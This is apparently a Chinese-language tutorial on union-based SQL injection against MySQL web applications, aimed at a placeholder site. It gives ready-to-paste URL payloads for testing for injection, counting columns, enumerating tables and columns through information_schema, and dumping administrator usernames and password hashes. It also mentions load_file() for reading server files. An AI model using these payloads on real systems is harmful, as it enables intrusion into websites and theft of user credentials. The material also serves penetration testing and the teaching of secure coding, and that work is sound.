### 1、mysql的注释符号

```
#
-- 内容
/*里面的内容都会被注释*/
```

用于注释后后面语句 不再执行
例如

```bash
select * from artile where id=1#这个部分的语句不再执行
```

### 2、注入常用查询系统信息函数

MySQL 版本：version();

数据库用户名：user();

数据库名：database();

数据库路径：@@datadir;

操作系统版本：@@version_compile_os;

### 3、判断是否存在注入

页面是否返回正常，或是否存在报错信息

and 1=1 正常
and 1=2 错误

&& 1=1  转码 %26%261=1  正常
&& 1=2  转码 %26%261=2  错误

```http
http://target_sys.com/article.php?id=1 and 1=1
http://target_sys.com/article.php?id=1 and 1=2 

http://target_sys.com/article.php?id=1 %26%261=1
http://target_sys.com/article.php?id=1 %26%261=2
```

or 1=1 
or 1=2

1||1=2 转码1 %7c%7c1=2  正常
-1||1=2 转码-1%7c%7c1=2 错误

```http
http://target_sys.com/article.php?id=-1 or 1=2
http://target_sys.com/article.php?id=1 or 1=2 

http://target_sys.com/article.php?id=1%7c%7c1=2
http://target_sys.com/article.php?id=-1%7c%7c1=2
```

&&与||这种特殊的符号 一定要在浏览器url前进行转码之后方可提交 因为浏览器默认不会进行编码

### 4、判断列数

order by 进行排列获取字段数

```http
http://target_sys.com/article.php?id=1 order by 3
```

order by 3 页面正常 order by 4 页面返回空白或者文章没有显示出来，列数为3个

mysql与access数据库不一样。在没有表名的前提下也可以查询数据库一些信息，如安装路径、库名、操作系统信息

系统用户名：system_user()

用户名：user()

当前用户名：current_user

连接数据库的用户名：session_user()

数据库名：database() 

数据库版本：version() MYSQL

MYSQL读取本地文件的函数：load_file() 

读取数据库路径：@@datadir 

安装路径：@@basedir MYSQL 

操作系统 ：@@version_compile_os 

### 5、联合查询 union select

union select 查询两个表的内容

```http
http://target_sys.com/article.php?id=-1 union select 1,2,3
http://target_sys.com/article.php?id=1 and 1=2 union select 1,2,3
```

以上两个语句的意思都是相同的 前面获取数据为null 将会显示后面的数字

### 6、查询库名

把数字替换成你要查询的函数名 database() 当前数据库名

```http
http://target_sys.com/article.php?id=1 and 1=2 union select 1,database(),3
```

### 7、查询表名

mysql 里面有一个库information_schema 里面存在很多信息，其中包括所有的库名， 表名， 字段名。因为可以利用这个库来获取当前库的表

语句如下

```http
http://target_sys.com/article.php?id=-1 union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1
```

target_sys库

```http
http://target_sys.com/article.php?id=-1 union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x7461726765745f737973 limit 0,1
```

这个database()函数与 target_sys 相同,如果不使用database()函数就要把target_sys 转换 十六进制 0x7461726765745f737973

limit 0,1 就是获取第一个表名，获取第二个表名就要把0 改变成1、第三个 2、 第四 3 如此类推 直接 返回 空

admin
article
moon_range

### 8、查询字段

查询字段也是查询 information_schema库 里的信息。

admin表 转换 成十六进制 0x61646d696e 

```http
http://target_sys.com/article.php?id=-1 union select 1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=0x61646d696e limit 0,1
```

id
username
password

### 9、查询数据

```http
http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(username,0x3a,password) from admin
```

group_concat() 用于 打印并接 字符串  输出两个字段的内容 0x3a是 字符 ：最终的结果是 

admin:e10adc3949ba59abbe56e057f20f883e